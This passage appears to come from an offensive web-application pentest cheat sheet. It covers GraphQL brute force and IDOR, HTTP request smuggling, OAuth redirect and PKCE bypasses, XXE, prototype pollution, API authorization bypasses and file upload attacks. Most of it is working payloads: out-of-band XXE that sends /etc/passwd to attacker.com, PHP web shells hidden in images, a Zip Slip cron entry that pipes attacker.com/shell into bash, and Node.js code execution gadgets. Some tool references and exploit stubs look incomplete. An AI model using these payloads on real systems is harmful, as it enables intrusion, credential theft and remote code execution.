# Array batching (some servers support JSON array of operations):
[
  {"query": "mutation { login(username: \"admin\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"pass2\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"pass3\") { token } }"}
]

# OTP brute force (bypass per-request rate limiting)
mutation {
  v1: verifyOTP(otp: "0000") { success }
  v2: verifyOTP(otp: "0001") { success }
  v3: verifyOTP(otp: "0002") { success }
  # ... all 10000 combinations in ~100 requests of 100 aliases each
}
```

### IDOR via GraphQL

```graphql
# Direct object ID enumeration
{ user(id: 2) { email password phone ssn } }
{ user(id: 3) { email password phone ssn } }

# UUID enumeration — use introspection to find ID format
{ orders { id total items { name price } } }
# Change to competitor's order:
{ order(id: "competitor-uuid-here") { total items { name price } } }

# Nested IDOR — access objects via relationships
{ user(id: 1) {
    privateMessages { id content recipient { email } }
    paymentMethods { cardNumber expiryDate cvv }
  }
}
```

### GraphQL Injection

```graphql
# Argument injection — if argument used in SQL/NoSQL query:
{ user(username: "admin' OR '1'='1") { password } }
{ user(username: {$ne: ""}) { password } }

# Directory traversal in file arguments:
{ getFile(path: "../../etc/passwd") { contents } }

# Template injection in message fields:
{ sendMessage(to: "user@test.com", subject: "{{7*7}}", body: "test") { sent } }

# SSRF via webhook/URL arguments:
mutation { createWebhook(url: "http://169.254.169.254/latest/meta-data/") { id } }
```

### Unauthorized Resolver Access

```graphql
# Admin queries often exposed without authorization check
{ adminPanel { users { id email role password } } }
{ internalMetrics { requestCount errorRate serverLoad } }
{ debugInfo { environment variables { name value } } }

# Mutations that should require elevated privileges:
mutation { deleteUser(id: 1) { success } }
mutation { grantAdmin(userId: 5) { success } }
mutation { viewAllOrders { id total user { email } } }
```

### Subscription Attacks

```graphql
# Subscribe to events for other users (missing authorization):
subscription {
  messageReceived(userId: "victim-uuid") {
    id
    content
    sender { username }
    timestamp
  }
}

# Subscribe to admin events:
subscription {
  adminAlerts {
    type
    message
    affectedUser { email }
  }
}

# WebSocket connection for subscriptions:
# Connect via wscat: wscat -c wss://target.com/graphql -H "Authorization: Bearer TOKEN"
# Then send subscription payload as JSON
```

---

## 6. HTTP Request Smuggling

### What It Is
HTTP request smuggling exploits discrepancies between front-end (load balancer/proxy) and back-end server parsing of `Content-Length` and `Transfer-Encoding` headers. The front-end processes one request; the back-end sees two — the second "smuggled" request is prepended to the next legitimate user's request.

### How to Find It During an Engagement
- Identify multi-tier HTTP setups (load balancers, CDNs, reverse proxies in front of app servers)
- Send CL and TE headers simultaneously — observe timing differences and error responses
- Use `smuggler.py` or Burp HTTP Request Smuggler extension for automated detection
- Look for unusual 400 errors, timing anomalies, or other users' responses leaking

### CL.TE (Front-end uses Content-Length, Back-end uses Transfer-Encoding)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

The front-end sends `13` bytes (the `0\r\n\r\nSMUGGLED` part). The back-end processes the chunk (empty chunk = end), leaving `SMUGGLED` in the buffer — prepended to the next request.

### TE.CL (Front-end uses Transfer-Encoding, Back-end uses Content-Length)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

Front-end processes chunk of 8 bytes (`SMUGGLED`) then terminal `0`. Back-end uses Content-Length: 3, reads `8\r\n` — leaving `SMUGGLED\r\n0\r\n\r\n` as prefix to next request.

### TE.TE (Both understand Transfer-Encoding — obfuscate to get one to ignore it)

```http
# Obfuscated TE header variants:
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: CHUNKED
Transfer-Encoding : chunked        (space before colon)
X-Transfer-Encoding: chunked
Transfer-Encoding: chunked, x
Transfer-Encoding:\x20chunked
Transfer-Encoding:\x09chunked      (tab)

# Double TE — one gets parsed, one ignored:
Transfer-Encoding: chunked
Transfer-Encoding: identity
```

### h2.CL — HTTP/2 Downgrade

HTTP/2 to HTTP/1 downgrade via front-end. H2 doesn't use Content-Length natively — when front-end downgrades to H1 and uses the attacker-specified Content-Length.

```
# H2 request (via Burp Repeater with HTTP/2):
:method: POST
:path: /
:authority: target.com
content-type: application/x-www-form-urlencoded
content-length: 0

# The front-end downgrades to HTTP/1 and uses the attacker content-length
# Inject smuggled request:
:method: POST
:path: /
:authority: target.com
content-length: 100

GET /admin HTTP/1.1
Host: target.com
Foo: x
```

### h2.TE — HTTP/2 with Transfer-Encoding

```
# HTTP/2 spec prohibits TE: chunked
# But some front-ends downgrade without stripping it:
:method: POST
:path: /
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```

### Smuggling to Bypass Access Controls

```http
# Goal: Access /admin endpoint blocked at front-end
# CL.TE smuggle an admin request:
POST / HTTP/1.1
Host: target.com
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Forwarded-Host: localhost
Content-Length: 10

x=
```

The back-end sees the smuggled `GET /admin` request prefixed to the next user's request — the next user effectively makes the admin request from the back-end's perspective (internal IP).

### Smuggling to Poison Cache / Capture Victim Requests

```http
# Smuggle a partial request header to capture next victim's request body:
POST / HTTP/1.1
Host: target.com
Content-Length: 330
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=attacker-session

comment=smuggled_prefix
```

The next victim's request (including their cookies) appends to the comment body — captured in the database.

### smuggler.py

```bash
# Install
git clone https://github.com/defparam/smuggler.git && cd smuggler

# Basic detection
python3 smuggler.py -u "https://target.com/"

# Test specific method
python3 smuggler.py -u "https://target.com/" -m POST

# Test all smuggling types
python3 smuggler.py -u "https://target.com/" -m POST --all

# Timeout adjustment (important for TE.CL timing)
python3 smuggler.py -u "https://target.com/" --timeout 10

# Headers file
python3 smuggler.py -u "https://target.com/" -H headers.txt
```

**Burp Turbo Intruder for smuggling:**
```python
# turbo-intruder script for CL.TE verification:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=5,
                            requestsPerConnection=1,
                            pipeline=False)

    # Detection request — look for timing difference
    engine.queue(target.req, pauseTime=10000, followRedirects=False)

def handleResponse(req, interesting):
    table.add(req)
```

---

## 7. OAuth 2.0 / OIDC Attacks

### What It Is
OAuth 2.0 and OpenID Connect are authorization/authentication frameworks widely implemented with subtle security bugs. Attacks target the authorization code flow: redirect_uri validation, state parameter handling, PKCE implementation, and token binding.

### How to Find It During an Engagement
- Identify OAuth flows: look for `/oauth/authorize`, `/oauth2/auth`, `/connect/authorize`
- Check `redirect_uri` parameter — is it validated against a whitelist or just a prefix match?
- Capture the authorization request and inspect all parameters: `state`, `nonce`, `code_challenge`, `response_type`
- Test `response_type=token` (implicit flow) — tokens in URL fragments
- Look for OAuth provider-app account linking functionality — common ATO surface

### Open Redirect in redirect_uri

```
# Whitelist bypass — if server validates prefix only:
redirect_uri=https://legitimate.com@attacker.com/
redirect_uri=https://legitimate.com.attacker.com/
redirect_uri=https://legitimate.com/../redirect?url=https://attacker.com/
redirect_uri=https://legitimate.com/callback?redirectTo=https://attacker.com/

# Open redirect on the legitimate domain + redirect_uri:
# If legitimate.com has /redirect?url= endpoint:
redirect_uri=https://legitimate.com/redirect?url=https://attacker.com/

# When code lands on attacker.com (via redirect), attacker exchanges it:
GET https://provider.com/token?grant_type=authorization_code&code=STOLEN_CODE&redirect_uri=https://attacker.com/

# Path traversal in redirect_uri:
redirect_uri=https://legitimate.com/callback/../evil
redirect_uri=https://legitimate.com/callback%2f..%2fevil

# Fragment injection — implicit flow, token in fragment:
redirect_uri=https://attacker.com/
# attacker.com's JS reads location.hash → steals token
```

### PKCE Bypass

PKCE (Proof Key for Code Exchange) prevents code interception — `code_verifier` must be known to exchange code. Bypass targets implementation flaws.

```
# Bypass 1: Server doesn't validate code_challenge at all
# Send authorization request with code_challenge, exchange code WITHOUT code_verifier
# If exchange succeeds → PKCE not enforced

# Bypass 2: code_challenge_method=plain (if supported)
# Use code_verifier == code_challenge (no hash required)
# Intercept code → replay with same code_verifier

# Bypass 3: code_challenge not bound to session
# Exchange code from victim's session using your own code_verifier
# Works if server validates verifier format but not binding

# Test: Intercept legitimate auth flow, replace code_challenge with your own
# Then exchange code with corresponding code_verifier
# If token issued → binding not enforced

# Bypass 4: Downgrade attack
# Remove code_challenge from request entirely
# If server still issues code → PKCE not required (optional, not mandatory)
```

### Token Leakage via Referer

```
# If authorization code or access token appears in URL (implicit flow or misconfigured):
# response_type=token → access_token in fragment (may leak via Referer)
# response_type=code → code in query param

# Scenario: After auth, redirect to page with third-party resources (analytics, CDN):
# Referer: https://app.com/callback?code=AUTH_CODE
# Third-party server receives the code in Referer header

# Exploiting:
# 1. Get victim to authorize
# 2. Their browser hits /callback?code=XXX
# 3. Page loads third-party iframe/image with Referer containing code
# 4. Check Referer at attacker-controlled domain
# Exchange stolen code for token

# Find via:
# Check network tab for outbound requests from /callback page
# Look for Referrer-Policy: no-referrer-when-downgrade (default — leaks to HTTP origins)
```

### State Parameter CSRF

If `state` parameter is missing or not validated, attacker can initiate OAuth flow and force victim to bind their account to attacker's authorization code.

```
# CSRF via state omission:
# 1. Attacker initiates OAuth flow → gets authorization URL with state
# 2. Does NOT follow redirect — keeps the authorization URL
# 3. Tricks victim into visiting the authorization URL (CSRF)
# 4. Victim authorizes the app → code returned with attacker's state
# 5. If attacker can exchange: victim's account now linked to attacker session

# Attack: Drop state parameter entirely
GET /oauth/authorize?client_id=APP&redirect_uri=https://app.com/callback&response_type=code
# (no &state=...)

# If server accepts → state not required → CSRF possible

# Predictable state:
# If state = base64(timestamp) or state = md5(sessionid) → predictable
# Attacker precomputes valid state value
```

### Account Takeover via Misbound OAuth

Pre-account takeover and account linking vulnerabilities:

```
# Scenario 1: Pre-ATO via account pre-creation
# 1. Attacker registers with victim@email.com + password (before victim uses OAuth)
# 2. Victim later signs in with OAuth (Google/GitHub) using victim@email.com
# 3. App merges accounts based on email match → attacker's password now grants access

# Scenario 2: OAuth login doesn't verify email
# 1. Attacker creates OAuth provider account with victim's email (if provider allows unverified email)
# 2. Logs into target app via OAuth → app trusts provider's email claim
# 3. App creates session for victim's account

# Scenario 3: Misbound account linking
# 1. Attacker has account at app.com
# 2. App has "link social account" feature
# 3. CSRF or state bypass in linking flow → link victim's OAuth identity to attacker's account
# 4. OAuth login as victim → arrives in attacker's account

# Scenario 4: sub claim not validated
# OIDC: sub claim is the stable unique identifier — must be validated, not just email
# If app uses email but not sub: email change on provider = account takeover

# Testing tool: Burp Suite OAuth Scanner (built-in from 2022+)
# Automatically checks: state presence/validation, PKCE, open redirect in redirect_uri
```

---

## 8. XXE Injection

### What It Is
XML External Entity injection exploits XML parsers that process external entity declarations. Attackers define entities that reference local files or remote URLs — the parser fetches and includes the content. Critical for file read, SSRF, and data exfiltration.

### How to Find It During an Engagement
- Any endpoint that parses XML: SOAP APIs, REST APIs with XML body, file upload (SVG, DOCX, XLSX, ODT)
- Change `Content-Type: application/json` to `Content-Type: application/xml` and send XML equivalent
- Try SVG upload wherever images are accepted
- Test SAML authentication endpoints
- Office document upload features (DOCX/XLSX are ZIP archives containing XML)

### Classic XXE — File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>

<!-- Windows targets -->
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">

<!-- /etc/shadow (if parser runs as root) -->
<!ENTITY xxe SYSTEM "file:///etc/shadow">

<!-- AWS credentials -->
<!ENTITY xxe SYSTEM "file:///home/user/.aws/credentials">
<!ENTITY xxe SYSTEM "file:///root/.aws/credentials">
```

### OOB XXE with DNS/HTTP Exfiltration

When file content isn't returned in response — exfiltrate via external connection.

```xml
<!-- Step 1: Host malicious DTD at attacker.com/evil.dtd -->
<!-- evil.dtd contents: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;

<!-- Step 2: Target XML payload (references attacker DTD) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root><data>anything</data></root>

<!-- DNS exfil (when HTTP blocked) -->
<!-- evil.dtd: -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.attacker.com/'>">
%eval;
%exfil;
```

### XXE via SVG Upload

SVG files are XML — processed by server-side image libraries.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

Upload as `profile.svg` or wherever images are accepted. If server renders SVG and returns image, file content appears in the image. If not visible, use OOB.

### XXE via DOCX/XLSX Upload

Office files are ZIP archives containing XML files.

```bash
# Unzip a DOCX
unzip target.docx -d docx_extracted/

# Edit word/document.xml or [Content_Types].xml
# Add DTD entity declaration:
# In word/document.xml, add DOCTYPE before root element:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Reference entity in text: &xxe;

# Repack
cd docx_extracted && zip -r ../malicious.docx .

# Or inject into [Content_Types].xml:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
```

### Blind XXE via Error Messages

Trigger parser error that includes file content in the error message.

```xml
<!-- Host at attacker.com/evil.dtd: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

<!-- Target payload: -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<foo/>

<!-- Parser error: "failed to open file:///nonexistent/root:x:0:0:root..." -->
<!-- File content appears in error message -->
```

### XXE to SSRF

```xml
<!-- HTTP request to internal services -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>

<!-- Internal network scanning -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/">
]>
<root>&xxe;</root>
```

### Parameter Entities for Blind XXE

Required when regular entities are filtered — only parameter entities (prefixed with `%`) work in DTD context.

```xml
<!-- % entity — defined and referenced in DTD, not in document content -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root/>

<!-- Parameter entity can reference other parameter entities in external DTD -->
<!-- (not allowed in internal DTD subset — key constraint) -->
```

### XXE in SAML

SAML authentication uses XML — XML signature wrapping and XXE are common attack surfaces.

```xml
<!-- Inject XXE into SAML assertion (base64-decoded) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:AuthnRequest [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ...>
  ...
</samlp:AuthnRequest>

<!-- Tool: SAML Raider (Burp extension) -->
<!-- Automatically modifies SAML for XXE, signature bypass, etc. -->
```

---

## 9. Prototype Pollution

### What It Is
Prototype pollution modifies `Object.prototype` in JavaScript — every object inherits the polluted properties. Client-side enables XSS by injecting properties that gadgets (libraries like jQuery, Lodash) use to generate HTML. Server-side (Node.js) enables code injection, privilege escalation, and RCE via property injection into spawned processes.

### How to Find It During an Engagement
- Look for deep merge, clone, or extend operations on user-controlled input
- URL parameters parsed recursively: `?__proto__[polluted]=true`
- JSON body with `__proto__` or `constructor.prototype` keys
- Browser console: `Object.prototype.polluted` — check if it's set after sending payload
- Use Burp + DOM Invader (built-in) for automated client-side prototype pollution finding

### Client-Side — URL Parameter Pollution

```
# Inject via URL query parameter:
https://target.com/?__proto__[polluted]=true
https://target.com/?constructor[prototype][polluted]=true

# Check in browser console:
Object.prototype.polluted  // Should return "true"

# Via JSON body (if deep-merged):
{"__proto__": {"polluted": true}}
{"constructor": {"prototype": {"polluted": true}}}
```

### jQuery Gadgets

```javascript
// jQuery.extend(true, ...) is vulnerable to prototype pollution
$.extend(true, {}, JSON.parse(userInput));

// Gadget 1: jQuery.parseHTML (used in many widgets)
// If Object.prototype.src is set → images load from attacker domain
{"__proto__": {"src": "//attacker.com/x"}}

// Gadget 2: jQuery.html() — triggers XSS
// Pollute innerHTML to inject script
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}

// Gadget 3: jQuery $() selector — pollute el
// jQuery $(selector) → if selector from prototype pollution contains XSS:
{"__proto__": {"jQuery": "1.12", "el": "<img src=x onerror=alert(1)>"}}

// Gadget 4: html key in older jQuery
{"__proto__": {"html": "<script>alert(1)</script>"}}

// DOM Clobbering via prototype pollution:
{"__proto__": {"isPrototypeOf": false}}
```

### Lodash Gadgets

```javascript
// Lodash merge, defaultsDeep, set vulnerable:
_.merge({}, JSON.parse(userInput));
_.defaultsDeep({}, JSON.parse(userInput));

// Payload:
{"__proto__": {"polluted": "value"}}
// or nested:
{"constructor": {"prototype": {"polluted": "value"}}}

// Lodash template gadget → RCE in Node.js:
{"__proto__": {"sourceURL": "\u2028/attacker.com/pwn.js"}}
// In older lodash — template compilation uses sourceURL
```

### Server-Side Prototype Pollution — Express/Node.js

```javascript
// Vulnerable pattern — deep merge of req.body:
const config = {};
deepMerge(config, req.body);  // req.body from JSON POST

// Payload to pollute:
{
  "__proto__": {
    "polluted": true
  }
}
```

**Property injection for access control bypass:**
```javascript
// If server checks: if (user.isAdmin) { ... }
// And isAdmin comes from a lookup that falls through to prototype:
{"__proto__": {"isAdmin": true}}

// Bypass authorization:
{"__proto__": {"authorized": true, "role": "admin"}}
```

### Prototype Pollution to RCE

**Via child_process.spawn options:**
```javascript
// If server spawns processes using options from prototype:
// child_process.spawn('cmd', args, options)
// Pollute shell option → command injection

// Payload:
{"__proto__": {"shell": "node", "env": {"NODE_OPTIONS": "--inspect=attacker.com:4444"}}}

// Via execArgv pollution (Node.js <16 in some configs):
{"__proto__": {"execArgv": ["--eval", "require('child_process').exec('id > /tmp/pwned')"]}}

// nodemon/pm2 gadget (if used):
{"__proto__": {"restart": true}}  // Triggers restart

// Via ejs template engine (common Express gadget):
{"__proto__": {"outputFunctionName": "x; process.mainModule.require('child_process').exec('id > /tmp/pwned'); x"}}

// Flatted/flat library gadget:
{"__proto__": {"__defineGetter__": "function(){return require('child_process').exec('id')}"}
```

### Detection Tools

```bash
# PPScan — browser console (client-side):
# Load bookmarklet from: https://github.com/nicowillis/ppfuzz

# ppfuzz — automated client-side scanner:
ppfuzz -l urls.txt

# Burp DOM Invader:
# Enable DOM Invader in Burp Browser → auto-detects prototype pollution sources/sinks

# Server-side detection — @nicowillis/server-side-prototype-pollution scanner:
# Or manual: send {"__proto__": {"status": 555}} to JSON endpoints
# If any response has status 555 → polluted

# Testing all properties:
for prop in ['toString', 'valueOf', 'hasOwnProperty', 'constructor']:
    send({"__proto__": {prop: "polluted"}})
```

---

## 10. API Security Testing

### What It Is
Modern application APIs — REST and GraphQL — expose business logic directly. Common vulnerabilities: Broken Object-Level Authorization (BOLA/IDOR), mass assignment from overly-permissive endpoints, excess data exposure, and function-level authorization gaps.

### How to Find It During an Engagement
- Collect all API endpoints via JS source, network tab, Swagger/OpenAPI specs, GraphQL introspection
- Create multiple test accounts at different privilege levels
- Replay requests from high-privilege account as low-privilege — observe what changes
- Look for numeric IDs in endpoints: `/api/orders/1234` → change to `/api/orders/1235`
- Check responses for excess fields not displayed in UI

### BOLA/IDOR Testing

```bash
# Test horizontal access — access other users' objects:
GET /api/v1/users/1001/profile → Change to /api/v1/users/1002/profile
GET /api/v1/invoices/ABC-1234 → ABC-1235, ABC-1236
GET /api/v1/messages?thread_id=7890 → 7891, 7892

# Test vertical access — access admin objects as normal user:
GET /api/v1/admin/users
GET /api/v1/users/1002/admin-notes
PUT /api/v1/users/1002/role {"role": "admin"}

# UUID IDORs (v4 UUIDs not guessable but may be enumerable via):
# - Other API endpoints that list IDs
# - Error messages
# - Linked object fields in API responses

# ffuf for IDOR endpoint enumeration:
ffuf -u "https://target.com/api/users/FUZZ/profile" \
  -w <(seq 1 1000) \
  -H "Authorization: Bearer USER_TOKEN" \
  -mc 200

# Automate with IDOR-Scanner or Autorize (Burp extension):
# Autorize: set low-priv header, browse as high-priv, auto-replays with low-priv
```

### Mass Assignment

When API automatically binds all request body fields to model — including restricted fields.

```bash
# Example: Registration endpoint
POST /api/v1/users
{"username": "attacker", "password": "pass123"}

# Test adding privileged fields:
POST /api/v1/users
{"username": "attacker", "password": "pass123", "role": "admin", "isAdmin": true, "verified": true}

# Profile update:
PUT /api/v1/profile
{"name": "User", "email": "user@x.com"}
# → Try:
{"name": "User", "email": "user@x.com", "role": "admin", "credits": 99999, "subscription": "enterprise"}

# Source of field names:
# 1. GET the object first — response reveals all available fields
# 2. Check API documentation/Swagger
# 3. JS source — look for model definitions
# 4. Error messages — "unknown field X"

# Tools: Arjun for parameter discovery:
arjun -u "https://target.com/api/v1/profile" -m PUT --headers "Authorization: Bearer TOKEN"
```

### Excessive Data Exposure

```bash
# API returns full object — UI filters display but all data in response:
GET /api/v1/users/1001
# UI shows: name, email
# Response actually contains: password_hash, ssn, credit_card, internal_id, admin_notes

# Grep responses for sensitive patterns:
# password, ssn, credit_card, token, secret, key, internal, admin, private

# Test undocumented fields by comparing mobile app vs web app responses
# Mobile apps often receive full objects — use Frida/apktool to capture traffic

# Check verbose error messages:
GET /api/v1/users/invalid_id
# May return: stack trace, DB query, environment info
```

### Function-Level Access Control Bypass

```bash
# HTTP method substitution:
GET /api/v1/admin/users → 403
POST /api/v1/admin/users → check if allowed (different handler)
PUT /api/v1/admin/users → check
HEAD /api/v1/admin/users → may bypass some WAFs
OPTIONS /api/v1/admin/users → reveals allowed methods

# Path case manipulation:
/api/v1/ADMIN/users
/api/v1/Admin/users
/api/V1/admin/users

# URL encoding:
/api/v1/admin%2fusers → may bypass WAF
/api/v1/admin%252fusers → double encoded

# Path traversal to admin:
/api/v1/user/profile/../../../admin/users
/api/v1/user/../admin/users

# Version downgrade:
/api/v2/admin/users → 403
/api/v1/admin/users → may be unprotected older version
/api/admin/users → no version prefix

# Remove trailing slash:
/api/v1/admin/users/ → /api/v1/admin/users
```

### Rate Limiting Bypass

```bash
# Header manipulation — some implementations trust X-Forwarded-For:
X-Forwarded-For: 1.1.1.1   (change IP per request)
X-Real-IP: 1.1.1.1
X-Originating-IP: 1.1.1.1
True-Client-IP: 1.1.1.1

# ffuf with rotating IP header:
ffuf -u "https://target.com/api/login" \
  -X POST -d '{"user":"admin","pass":"FUZZ"}' \
  -w passwords.txt \
  -H "X-Forwarded-For: HFUZZ" \
  -w2 <(for i in $(seq 1 100); do echo "10.0.0.$i"; done)

# Null byte / encoding tricks:
username=admin%00   (null byte appended)

# JSON key case variation:
{"Username": "admin"}
{"USERNAME": "admin"}

# Endpoint variation:
/api/login vs /API/login vs /api/v2/login

# Burp Rate-Limit Bypass intruder payload:
# Use Pitchfork mode with IP rotation in header column
```

### API Key Extraction

```bash
# JavaScript source mining:
# Browser DevTools → Sources → search for: apiKey, api_key, token, secret, Bearer
grep -r "apiKey\|api_key\|Authorization\|Bearer" --include="*.js" .

# Git history exposure:
git log --all --full-history -- "*.env"
git show <commit>:<file>
trufflehog git https://github.com/target/repo --only-verified

# Common exposed locations:
curl https://target.com/app.js | grep -oE '"[A-Za-z0-9_-]{32,}"'
curl https://target.com/config.js | grep -i key
https://target.com/.env
https://target.com/config.json
https://target.com/api/swagger.json   # May expose example keys

# Tools:
secretfinder -i https://target.com/ -e  # Extract from JS
trufflehog filesystem /path/to/code
gitleaks detect --source . --verbose
```

### API Endpoint Discovery

```bash
# ffuf with API-specific wordlist:
ffuf -u "https://target.com/api/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -H "Authorization: Bearer TOKEN" \
  -mc 200,201,400,401,403

# SecLists has multiple API wordlists:
# /Discovery/Web-Content/api/
# /Discovery/Web-Content/raft-large-words.txt

# Version enumeration:
ffuf -u "https://target.com/FUZZ/users" \
  -w <(printf "api\napi/v1\napi/v2\napi/v3\nv1\nv2\nv3\nrest\nservices") \
  -mc 200

# Swagger/OpenAPI discovery:
ffuf -u "https://target.com/FUZZ" \
  -w <(printf "swagger.json\nswagger.yaml\nopenapi.json\napi-docs\nv2/api-docs\napi/swagger-ui.html") \
  -mc 200

# kiterunner — API-aware fuzzer (understands HTTP methods + parameter shapes):
kr scan https://target.com -w routes-large.kite
kr scan https://target.com -w routes-large.kite -H "Authorization: Bearer TOKEN"
```

---

## 11. File Upload Attacks

### What It Is
File upload functionality is a high-value attack surface. Attackers bypass content restrictions to upload executable code (web shells), craft polyglot files that parse as both image and code, exploit path handling for traversal, or trigger vulnerabilities in server-side file processing libraries.

### How to Find It During an Engagement
- Map all file upload endpoints: profile photos, document uploads, import functions, attachments
- Check the actual file storage path — is it web-accessible?
- Test what happens with double extensions: `shell.php.jpg`, `shell.php%00.jpg`
- Intercept and modify Content-Type header independently of filename
- Send oversized payloads to probe error handling

### PHP+JPG Polyglot Web Shell

A file that is simultaneously a valid JPEG and valid PHP — bypasses image validation libraries that check file content.

```bash
# Method 1: Inject PHP into JPEG comment using exiftool
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit.jpg
mv legit.jpg shell.php.jpg

# Method 2: Append PHP to valid JPEG
cat legit.jpg > shell.php.jpg
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.jpg

# Method 3: PHP in JPEG EXIF data (survives some image resizing)
exiftool -DocumentName='<?php system($_GET["cmd"]); ?>' photo.jpg
# Then rename to .php if PHP extension allowed

# Verify polyglot still valid as JPEG:
file shell.php.jpg   # Should say: JPEG image data

# If server renames file but preserves extension:
exiftool -FileName='shell.php' photo.jpg   # Change in EXIF
```

### Content-Type Bypass

```
# Change Content-Type in intercepted request:
# File: shell.php
# Original: Content-Type: application/x-php → Rejected
# Modified: Content-Type: image/jpeg → Accepted

# Intercept with Burp, change Content-Type:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    ← changed from application/x-php

# Also try:
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/octet-stream

# GIF magic bytes bypass (GIF89a prefix):
echo -e 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.php
# Upload as shell.php with Content-Type: image/gif

# Valid PNG header + PHP:
python3 -c "
import struct, zlib
# Minimal valid PNG header
header = b'\x89PNG\r\n\x1a\n' + b'\x00'*8
print(header.decode('latin1') + '<?php system(\$_GET[\"cmd\"]); ?>')
" > shell.php
```

### Double Extension

```
shell.php.jpg       → Server may execute .php, ignore .jpg
shell.php%00.jpg    → Null byte truncates at .php (older PHP/servers)
shell.php .jpg      → Space before extension
shell.pHp           → Case variation (case-insensitive filesystems)
shell.php5          → Alternative PHP extension
shell.phtml         → Alternative PHP extension
shell.phar          → PHP Archive (often overlooked)
shell.shtml         → SSI parsing
shell.php::$DATA    → NTFS ADS (Windows IIS)
shell.asp;.jpg      → IIS semicolon bypass
shell.aspx_bak      → Custom extensions that might execute
```

### Path Traversal in Filename

```
filename="../../../var/www/html/shell.php"
filename="../../web/shell.php"
filename="..%2F..%2Fshell.php"
filename="....//....//shell.php"

# In multipart upload:
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
Content-Type: image/jpeg

# Windows:
filename="..\\..\\.\\inetpub\\wwwroot\\shell.asp"

# Tools:
# upload_bypass.py automates path traversal + extension bypass combinations
```

### Zip Slip

Malicious ZIP file contains path traversal in entry filenames — extraction writes files outside target directory.

```python
# Craft malicious ZIP with Python:
import zipfile

with zipfile.ZipFile('malicious.zip', 'w') as zf:
    # Normal file
    zf.writestr('normal.txt', 'normal content')
    # Traversal payload
    zf.writestr('../../../var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>')
    zf.writestr('../../etc/cron.d/backdoor', '* * * * * root curl http://attacker.com/shell | bash')

# evilarc tool (more options):
python evilarc.py shell.php -o malicious.zip -d 3 -p "var/www/html/"
# -d 3 = 3 directory levels up
# -p = target path after traversal
```

### ImageTragick (CVE-2016-3714) and ImageMagick Exploits

**ImageTragick** — classic but unpatched installs still exist (2024+):
```
# Upload an MVG or SVG file that triggers delegate command execution:
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com/"|id > /tmp/pwned")'
pop graphic-context
```

**More ImageMagick vulnerabilities (2023-2024):**
```
# CVE-2023-34152 — Shell injection via SUID application
# Affects ImageMagick < 7.1.1-15
# In filename argument: `id`  or $(id) in crafted SVG href

# CVE-2022-44268 — Arbitrary file read via PNG profile
# Craft PNG with text chunk referencing local file:
python3 -c "
import struct, zlib, sys

def create_png_with_read(filepath):
    # PNG with tEXt chunk containing file path
    # Server-side ImageMagick reads file into output PNG metadata
    ...
"

# Practical exploit for CVE-2022-44268:
# pip install pillow
python3 -c "
from PIL import Image
import zlib, struct

img = Image.new('RGB', (1, 1))
img.save('exploit.png')
"
# Then use exploit PoC to inject /etc/passwd read into PNG metadata
# Tool: https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC

# Identify ImageMagick version:
identify --version
convert --version

